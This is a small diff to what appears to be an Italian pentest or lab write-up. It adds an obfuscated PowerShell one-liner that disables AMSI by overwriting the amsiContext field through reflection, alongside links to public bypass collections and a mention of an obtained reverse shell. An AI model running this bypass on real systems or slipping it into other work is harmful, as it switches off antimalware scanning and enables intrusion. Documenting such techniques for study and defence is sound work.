@@ -356,4 +356,8 @@ Ora abbiamo ottenuto una reverse shell
 *AMSI Bypass*
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 [amsi.fail](https://amsi.fail/)
-Io ho usato una versione modificata di quelli trovab
+Io ho usato una versione modificata di quelli trovabili in questi due link
+```PowerShell
+$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
+```
+
